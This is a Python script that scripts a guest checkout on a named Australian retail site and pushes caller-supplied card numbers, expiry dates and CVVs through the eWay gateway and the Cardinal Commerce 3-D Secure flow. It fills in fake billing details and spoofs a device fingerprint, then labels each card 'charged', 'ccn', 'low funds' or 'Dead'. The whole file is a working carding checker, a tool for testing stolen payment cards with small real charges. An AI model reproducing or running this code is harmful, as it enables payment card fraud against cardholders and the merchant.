import urllib.parse, base64, asyncio
from utilsdf.functions import capture
from httpx import AsyncClient


async def djbaby(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:
        head = {
            "Host": "www.sportyshealth.com.au",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        }

        r = await session.get(
            "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
            headers=head,
        )
        cookies_1 = "; ".join([f"{key}={value}" for key, value in r.cookies.items()])
        xi = urllib.parse.unquote(
            capture(cookies_1, "xid_sph_364e1=Set-Cookie: xid_sph_364e1=", ";")
        )

        head2 = {
            "Host": "www.sportyshealth.com.au",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.sportyshealth.com.au",
            "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
        }

        post2 = "mode=add&productid=7776&cat=&page=&product_options%5B6036%5D=11590&product_options%5B6037%5D=11591&amount=1"

        r2 = await session.post(
            "https://www.sportyshealth.com.au/cart.php",
            headers=head2,
            data=post2,
        )

        head3 = {
            "Host": "www.sportyshealth.com.au",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
        }

        r3 = await session.get(
            "https://www.sportyshealth.com.au/cart.php?mode=checkout",
            headers=head3,
        )

        head4 = {
            "Host": "www.sportyshealth.com.au",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.sportyshealth.com.au",
            "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
        }

        post4 = f"usertype=C&anonymous=Y&xid_sph_364e1={xi}&address_book%5BB%5D%5Bfirstname%5D=Sachio&address_book%5BB%5D%5Blastname%5D=YT&address_book%5BB%5D%5Baddress%5D=118+W+132nd+St&address_book%5BB%5D%5Baddress_2%5D=YT&address_book%5BB%5D%5Bcity%5D=Banjup&address_book%5BB%5D%5Bstate%5D=WA&address_book%5BB%5D%5Bcountry%5D=AU&address_book%5BB%5D%5Bzipcode%5D=6164&address_book%5BB%5D%5Bphone%5D=19006318646&email=sachiopremiun%40gmail.com&pending_membershipid=&reg_code=&uname=&password_is_modified=N&passwd1=&passwd2=&address_book%5BS%5D%5Bfirstname%5D=&address_book%5BS%5D%5Blastname%5D=&address_book%5BS%5D%5Baddress%5D=&address_book%5BS%5D%5Baddress_2%5D=&address_book%5BS%5D%5Bcity%5D=Bundall&address_book%5BS%5D%5Bstate%5D=QLD&address_book%5BS%5D%5Bcountry%5D=AU&address_book%5BS%5D%5Bzipcode%5D=4217&address_book%5BS%5D%5Bphone%5D=&address_book%5BS%5D%5Bemail%5D="

        r4 = await session.post(
            "https://www.sportyshealth.com.au/cart.php?mode=checkout",
            headers=head4,
            data=post4,
        )

        post5 = "shippingid=202&mode=checkout&action=update"

        r5 = await session.post(
            "https://www.sportyshealth.com.au/cart.php?mode=checkout",
            headers=head4,
            data=post5,
        )

        head6 = {
            "Host": "www.sportyshealth.com.au",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.sportyshealth.com.au",
            "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
        }

        post6 = f"paymentid=26&action=place_order&xid_sph_364e1={xi}&payment_method=Credit+Card+-+eWay+3DSecure&Customer_Notes=&authority_to_leave=1&accept_terms=Y"

        r6 = await session.post(
            "https://www.sportyshealth.com.au/payment/payment_cc.php",
            headers=head6,
            data=post6,
        )
        ew = capture(
            r6.text,
            '"https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode=',
            '"',
        )
        bi = capture(r6.text, "?ordr=", "&")

        head7 = {
            "Host": "secure.ewaypayments.com",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://secure.ewaypayments.com",
            "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
        }

        post7 = f"EWAY_ACCESSCODE={ew}&EWAY_VIEW=Modal&EWAY_ISSHAREDPAYMENT=true&EWAY_ISMODALPAGE=true&EWAY_APPLYSURCHARGE=true&EWAY_CUSTOMERREADONLY=False&PAYMENT_TRANTYPE=Purchase&AMEXEC_ENCRYPTED_DATA=&EWAY_PAYMENTTYPE=creditcard&EWAY_CUSTOMEREMAIL=ascasc%40gmail.com&EWAY_CUSTOMERPHONE=2240396666&EWAY_CARDNUMBER={cc}&EWAY_CARDNAME=assacsac&EWAY_CARDEXPIRYMONTH={month}&EWAY_CARDEXPIRYYEAR={year}&EWAY_CARDCVN={cvv}&AMEXEC_RESPONSE="

        r7 = await session.post(
            "https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment",
            headers=head7,
            data=post7,
        )

        head8 = {
            "Host": "cerberus.prodcde.ewaylabs.cloud",
            "accept": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://secure.ewaypayments.com",
            "referer": "https://secure.ewaypayments.com/",
        }

        r8 = await session.get(
            f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/queryInit",
            headers=head8,
        )
        jt = capture(r8.text, '"jwt":"', '"')

        head9 = {
            "Host": "centinelapi.cardinalcommerce.com",
            "content-type": "application/json;charset=UTF-8",
            "x-cardinal-tid": "Tid-03261287-d74a-4852-8d67-e945b98dfe6b",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "origin": "https://secure.ewaypayments.com",
            "referer": "https://secure.ewaypayments.com/",
        }

        post9 = {
            'BrowserPayload': {
        'Order': {
            'OrderDetails': {},
            'Consumer': {
                'BillingAddress': {},
                'ShippingAddress': {},
                'Account': {},
            },
            'Cart': [],
            'Token': {},
            'Authorization': {},
            'Options': {},
            'CCAExtension': {},
        },
        'SupportsAlternativePayments': {
            'cca': True,
            'hostedFields': False,
            'applepay': False,
            'discoverwallet': False,
            'wallet': False,
            'paypal': False,
            'visacheckout': False,
        },
    },
    'Client': {
        'Agent': 'SongbirdJS',
        'Version': '1.35.0',
    },
    'ConsumerSessionId': '0_9c9cd616-e6e8-4d9a-b6ac-e3429584375d',
        'ServerJWT': f"{jt}",
}

        await asyncio.sleep(4)

        r9 = await session.post(
            "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",
            headers=head9,
            json=post9,
        )

        re_ = capture(r9.text, '"CardinalJWT":"', '"')
        encabezado_base64, carga_util_base64, firma = re_.split(".")
        re_1 = base64.urlsafe_b64decode(
            carga_util_base64 + "=" * (4 - len(carga_util_base64) % 4)
        ).decode("utf-8")
        re = capture(re_1, '"referenceId":"', '",')
        ge = capture(re_1, '"geolocation":"', '"')
        org = capture(re_1, '"orgUnitId":"', '"')

        r10 = await session.get(
            f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        )
        no = capture(r10.text, '"nonce":"', '"')

        head11 = {
            "Host": "geo.cardinalcommerce.com",
            "content-type": "application/json",
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://geo.cardinalcommerce.com",
            "referer": f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        }

        post11 = {
            'Cookies': {
        'Legacy': True,
        'LocalStorage': True,
        'SessionStorage': True,
    },
    'DeviceChannel': 'Browser',
    'Extended': {
        'Browser': {
            'Adblock': True,
            'AvailableJsFonts': [],
            'DoNotTrack': 'unknown',
            'JavaEnabled': False,
        },
        'Device': {
            'ColorDepth': 24,
            'Cpu': 'unknown',
            'Platform': 'Win32',
            'TouchSupport': {
                'MaxTouchPoints': 0,
                'OnTouchStartAvailable': False,
                'TouchEventCreationSuccessful': False,
            },
        },
    },
    'Fingerprint': '8862b0fed3cc7f5888d062fa0afc9b85',
    'FingerprintingTime': 133,
    'FingerprintDetails': {
        'Version': '1.5.1',
    },
    'Language': 'en-US',
    'Latitude': None,
    'Longitude': None,
    "OrgUnitId": f"{org}",
    'Origin': 'Songbird',
    'Plugins': [
        'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
    ],
    "ReferenceId": f"{re}",
    'Referrer': '',
    'Screen': {
        'FakedResolution': False,
        'Ratio': 1.3333333333333333,
        'Resolution': '1024x768',
        'UsableResolution': '1024x728',
        'CCAScreenSize': '02',
    },
    'CallSignEnabled': None,
    'ThreatMetrixEnabled': False,
    'ThreatMetrixEventType': 'PAYMENT',
    'ThreatMetrixAlias': 'Default',
    'TimeOffset': -120,
    'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'UserAgentDetails': {
        'FakedOS': False,
        'FakedBrowser': False,
    },
    "BinSessionId": f"{no}",
}

        r11 = await session.post(
            "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",
            headers=head11,
            json=post11,
        )

        head12 = {
            "Host": "cerberus.prodcde.ewaylabs.cloud",
            "x-browser": "false,es-419,24,800,360,300",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "text/plain",
            "accept": "application/json",
            "origin": "https://secure.ewaypayments.com",
            "referer": "https://secure.ewaypayments.com/",
        }

        r12 = await session.put(
            f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/enroll",
            headers=head12,
        )
        

        head13 = {
            "Host": "secure.ewaypayments.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
        }

        r13 = await session.post(
            f"https://secure.ewaypayments.com/Complete3D/{ew}",
            headers=head13,
        )

        head14 = {
            "Host": "secure.ewaypayments.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://www.sportyshealth.com.au/",
        }

        r14 = await session.get(
            f"https://secure.ewaypayments.com/sharedpage/sharedpayment/Result?AccessCode={ew}",
            headers=head14,
        )

        head15 = {
            "Host": "www.sportyshealth.com.au",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://www.sportyshealth.com.au/payment/payment_cc.php",
        }

        r15 = await session.get(
            f"https://www.sportyshealth.com.au/payment/cc_eway_iframe_results.php?ordr={bi}&PageSpeed=Off&AccessCode={ew}",
            headers=head15,
        )
        r15_ = r15.text
        msg = capture(r15_, '"form-text">Reason:</span> ', " <br />")
        code = capture(r15_, "ResponseCode: ", "<br />")
        msg2 = capture(r15_, "ResponseMessage: ", "<br />")

        if r15.status_code == 302 or "00" in code or "00" in msg2 or "A" in msg2:
            status = "Approved! ✅ -» charged!"
            msg = "Transaction Approved -» $9.95"
        elif "D4482" in msg2:
            status = "Approved! ✅ -» ccn"
            msg = f"CVV Validation Error ({msg2})"
        elif "06" in code:
            status = "Approved! ✅ -» ccn"
            msg = f"CVV Validation Error ({code})"
        elif "51" in msg2 or "D4451" in msg2:
            status = "Approved! ✅ -» low funds"
            msg = f"Insufficient Funds ({msg2})"
        else:
            status = "Dead! ❌"

